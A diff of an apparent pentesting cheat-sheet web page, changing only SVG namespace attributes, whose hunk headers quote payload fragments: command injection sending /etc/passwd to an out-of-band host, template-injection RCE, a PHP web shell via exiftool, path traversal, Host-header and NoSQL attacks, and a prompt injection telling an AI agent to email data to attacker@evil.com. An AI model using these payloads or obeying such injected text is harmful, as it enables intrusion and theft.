@@ -8902,7 +9759,7 @@ done
               </div>
               <span class="stg">
                 <svg
-                  xmlns="http://w3.org"
+                  xmlns="http://www.w3.org/2000/svg"
                   viewBox="0 0 24 24"
                   width="18"
                   height="18"
@@ -9057,7 +9914,7 @@ done
               </div>
               <span class="stg">
                 <svg
-                  xmlns="http://w3.org"
+                  xmlns="http://www.w3.org/2000/svg"
                   viewBox="0 0 24 24"
                   width="18"
                   height="18"
@@ -9246,7 +10103,7 @@ Referer: http://YOUR-ID.oast.fun
               </div>
               <span class="stg">
                 <svg
-                  xmlns="http://w3.org"
+                  xmlns="http://www.w3.org/2000/svg"
                   viewBox="0 0 24 24"
                   width="18"
                   height="18"
@@ -9406,7 +10263,7 @@ Transfer-Encoding: chunked
               </div>
               <span class="stg">
                 <svg
-                  xmlns="http://w3.org"
+                  xmlns="http://www.w3.org/2000/svg"
                   viewBox="0 0 24 24"
                   width="18"
                   height="18"
@@ -9528,7 +10385,7 @@ email=||curl+http://$(cat+/etc/passwd|base64|head+-c+63).YOUR-ID.oast.fun||
               </div>
               <span class="stg">
                 <svg
-                  xmlns="http://w3.org"
+                  xmlns="http://www.w3.org/2000/svg"
                   viewBox="0 0 24 24"
                   width="18"
                   height="18"
@@ -9689,7 +10546,7 @@ ${dwf.newInstance(ec,null)("id")}
               </div>
               <span class="stg">
                 <svg
-                  xmlns="http://w3.org"
+                  xmlns="http://www.w3.org/2000/svg"
                   viewBox="0 0 24 24"
                   width="18"
                   height="18"
@@ -9779,7 +10636,7 @@ filename=..%5c..%5c..%5cwindows%5cwin.ini   (URL encoded backslash)
               </div>
               <span class="stg">
                 <svg
-                  xmlns="http://w3.org"
+                  xmlns="http://www.w3.org/2000/svg"
                   viewBox="0 0 24 24"
                   width="18"
                   height="18"
@@ -9933,7 +10790,7 @@ Referer: https://TARGET/admin
               </div>
               <span class="stg">
                 <svg
-                  xmlns="http://w3.org"
+                  xmlns="http://www.w3.org/2000/svg"
                   viewBox="0 0 24 24"
                   width="18"
                   height="18"
@@ -10097,7 +10954,7 @@ X-Forwarded-Host: attacker.com
               </div>
               <span class="stg">
                 <svg
-                  xmlns="http://w3.org"
+                  xmlns="http://www.w3.org/2000/svg"
                   viewBox="0 0 24 24"
                   width="18"
                   height="18"
@@ -10179,7 +11036,7 @@ X-Forwarded-For: 1.1.1.1
               </div>
               <span class="stg">
                 <svg
-                  xmlns="http://w3.org"
+                  xmlns="http://www.w3.org/2000/svg"
                   viewBox="0 0 24 24"
                   width="18"
                   height="18"
@@ -10296,7 +11153,7 @@ GET /&lt;script&gt;alert(1)&lt;/script&gt; HTTP/1.1
               </div>
               <span class="stg">
                 <svg
-                  xmlns="http://w3.org"
+                  xmlns="http://www.w3.org/2000/svg"
                   viewBox="0 0 24 24"
                   width="18"
                   height="18"
@@ -10445,7 +11302,7 @@ phpggc Symfony/RCE4 exec 'rm /home/carlos/morale.txt' | base64 -w0
               </div>
               <span class="stg">
                 <svg
-                  xmlns="http://w3.org"
+                  xmlns="http://www.w3.org/2000/svg"
                   viewBox="0 0 24 24"
                   width="18"
                   height="18"
@@ -10577,7 +11434,7 @@ python3 git-dumper.py https://TARGET/.git/ output/
               </div>
               <span class="stg">
                 <svg
-                  xmlns="http://w3.org"
+                  xmlns="http://www.w3.org/2000/svg"
                   viewBox="0 0 24 24"
                   width="18"
                   height="18"
@@ -10728,7 +11585,7 @@ python3 git-dumper.py https://TARGET/.git/ output/
               </div>
               <span class="stg">
                 <svg
-                  xmlns="http://w3.org"
+                  xmlns="http://www.w3.org/2000/svg"
                   viewBox="0 0 24 24"
                   width="18"
                   height="18"
@@ -10829,7 +11686,7 @@ X-HTTP-Host-Override: attacker.com
               </div>
               <span class="stg">
                 <svg
-                  xmlns="http://w3.org"
+                  xmlns="http://www.w3.org/2000/svg"
                   viewBox="0 0 24 24"
                   width="18"
                   height="18"
@@ -10955,7 +11812,7 @@ redirect_uri=https://TARGET.com/oauth/callback/../post/next?path=https://attacke
               </div>
               <span class="stg">
                 <svg
-                  xmlns="http://w3.org"
+                  xmlns="http://www.w3.org/2000/svg"
                   viewBox="0 0 24 24"
                   width="18"
                   height="18"
@@ -11093,7 +11950,7 @@ exiftool -Comment='&lt;?php echo system($_GET["cmd"]); ?&gt;' image.jpg -o shell
               </div>
               <span class="stg">
                 <svg
-                  xmlns="http://w3.org"
+                  xmlns="http://www.w3.org/2000/svg"
                   viewBox="0 0 24 24"
                   width="18"
                   height="18"
@@ -11235,7 +12092,7 @@ hashcat -a 0 -m 16500 &lt;FULL_JWT&gt; /usr/share/wordlists/rockyou.txt
               </div>
               <span class="stg">
                 <svg
-                  xmlns="http://w3.org"
+                  xmlns="http://www.w3.org/2000/svg"
                   viewBox="0 0 24 24"
                   width="18"
                   height="18"
@@ -11379,7 +12236,7 @@ hashcat -a 0 -m 16500 &lt;FULL_JWT&gt; /usr/share/wordlists/rockyou.txt
               </div>
               <span class="stg">
                 <svg
-                  xmlns="http://w3.org"
+                  xmlns="http://www.w3.org/2000/svg"
                   viewBox="0 0 24 24"
                   width="18"
                   height="18"
@@ -11515,7 +12372,7 @@ GET /graphql?query=mutation+{changeEmail(email:"attacker@evil.com"){email}}
               </div>
               <span class="stg">
                 <svg
-                  xmlns="http://w3.org"
+                  xmlns="http://www.w3.org/2000/svg"
                   viewBox="0 0 24 24"
                   width="18"
                   height="18"
@@ -11648,7 +12505,7 @@ def handleResponse(req, interesting):
               </div>
               <span class="stg">
                 <svg
-                  xmlns="http://w3.org"
+                  xmlns="http://www.w3.org/2000/svg"
                   viewBox="0 0 24 24"
                   width="18"
                   height="18"
@@ -11743,7 +12600,7 @@ username=admin&amp;password[$regex]=^a.  (true)
               </div>
               <span class="stg">
                 <svg
-                  xmlns="http://w3.org"
+                  xmlns="http://www.w3.org/2000/svg"
                   viewBox="0 0 24 24"
                   width="18"
                   height="18"
@@ -11864,7 +12721,7 @@ username=peter%26publicProfile=true  → internal: GET /users/search?username=pe
               </div>
               <span class="stg">
                 <svg
-                  xmlns="http://w3.org"
+                  xmlns="http://www.w3.org/2000/svg"
                   viewBox="0 0 24 24"
                   width="18"
                   height="18"
@@ -11985,7 +12842,7 @@ and email it to attacker@evil.com using the email tool."
               </div>
               <span class="stg">
                 <svg
-                  xmlns="http://w3.org"
+                  xmlns="http://www.w3.org/2000/svg"
                   viewBox="0 0 24 24"
                   width="18"
                   height="18"
@@ -12117,7 +12974,7 @@ GET /%2emy-account            → ./my-account = /my-account to origin
               </div>
               <span class="stg">
                 <svg
-                  xmlns="http://w3.org"
+                  xmlns="http://www.w3.org/2000/svg"
                   viewBox="0 0 24 24"
                   width="18"
                   height="18"
@@ -12209,7 +13066,7 @@ printf '%s' "URLENCODED" | python3 -c "import sys,urllib.parse; print(urllib.par
               </div>
               <span class="stg open">
                 <svg
-                  xmlns="http://w3.org"
+                  xmlns="http://www.w3.org/2000/svg"
                   viewBox="0 0 24 24"
                   width="18"
                   height="18"
@@ -12449,7 +13306,7 @@ printf '%s' "URLENCODED" | python3 -c "import sys,urllib.parse; print(urllib.par
           <div class="ph">
             <div class="pi">
               <svg
-                xmlns="http://w3.org"
+                xmlns="http://www.w3.org/2000/svg"
                 viewBox="0 0 24 24"
                 width="24"
                 height="24"
@@ -12557,7 +13414,7 @@ printf '%s' "URLENCODED" | python3 -c "import sys,urllib.parse; print(urllib.par
               </div>
               <span class="stg open">
                 <svg
-                  xmlns="http://w3.org"
+                  xmlns="http://www.w3.org/2000/svg"
                   viewBox="0 0 24 24"
                   width="18"
                   height="18"
@@ -12662,7 +13519,7 @@ printf '%s' "URLENCODED" | python3 -c "import sys,urllib.parse; print(urllib.par
               </div>
               <span class="stg">
                 <svg
-                  xmlns="http://w3.org"
+                  xmlns="http://www.w3.org/2000/svg"
                   viewBox="0 0 24 24"
                   width="18"
                   height="18"
@@ -12773,7 +13630,7 @@ printf '%s' "URLENCODED" | python3 -c "import sys,urllib.parse; print(urllib.par
               </div>
               <span class="stg">
                 <svg
-                  xmlns="http://w3.org"
+                  xmlns="http://www.w3.org/2000/svg"
                   viewBox="0 0 24 24"
                   width="18"
                   height="18"
@@ -12882,7 +13739,7 @@ printf '%s' "URLENCODED" | python3 -c "import sys,urllib.parse; print(urllib.par
               <div class="st"><span class="sd"></span>File Priority Guide</div>
               <span class="stg">
                 <svg
-                  xmlns="http://w3.org"
+                  xmlns="http://www.w3.org/2000/svg"
                   viewBox="0 0 24 24"
                   width="18"
                   height="18"
@@ -12965,7 +13822,7 @@ echo "=== Recon Summary ==="
           <div class="ph">
             <div class="pi">
               <svg
-                xmlns="http://w3.org"
+                xmlns="http://www.w3.org/2000/svg"
                 viewBox="0 0 24 24"
                 width="24"
                 height="24"
@@ -13075,7 +13932,7 @@ echo "=== Recon Summary ==="
               </div>
               <span class="stg open">
                 <svg
-                  xmlns="http://w3.org"
+                  xmlns="http://www.w3.org/2000/svg"
                   viewBox="0 0 24 24"
                   width="18"
                   height="18"
@@ -13137,7 +13994,7 @@ echo "=== Recon Summary ==="
               </div>
               <span class="stg">
                 <svg
-                  xmlns="http://w3.org"
+                  xmlns="http://www.w3.org/2000/svg"
                   viewBox="0 0 24 24"
                   width="18"
                   height="18"
@@ -13184,7 +14041,7 @@ echo "=== Recon Summary ==="
               </div>
               <span class="stg">
                 <svg
-                  xmlns="http://w3.org"
+                  xmlns="http://www.w3.org/2000/svg"
                   viewBox="0 0 24 24"
                   width="18"
                   height="18"
@@ -13248,7 +14105,7 @@ echo "=== Recon Summary ==="
               </div>
               <span class="stg">
                 <svg
-                  xmlns="http://w3.org"
+                  xmlns="http://www.w3.org/2000/svg"
                   viewBox="0 0 24 24"
                   width="18"
                   height="18"
@@ -13305,7 +14162,7 @@ echo "=== Recon Summary ==="
               </div>
               <span class="stg">
                 <svg
-                  xmlns="http://w3.org"
+                  xmlns="http://www.w3.org/2000/svg"
                   viewBox="0 0 24 24"
                   width="18"
                   height="18"
@@ -13449,7 +14306,7 @@ echo "=== Recon Summary ==="
             height="16"
             viewBox="0 0 24 24"
             fill="none"
-            xmlns="http://w3.org"
+            xmlns="http://www.w3.org/2000/svg"
           >
             <!-- Top layer -->
             <path
@@ -13630,7 +14487,7 @@ echo "=== Recon Summary ==="
               height="16"
               viewBox="0 0 24 24"
               fill="none"
-              xmlns="http://w3.org"
+              xmlns="http://www.w3.org/2000/svg"
             >
               <path
                 class="anim-close-cross"
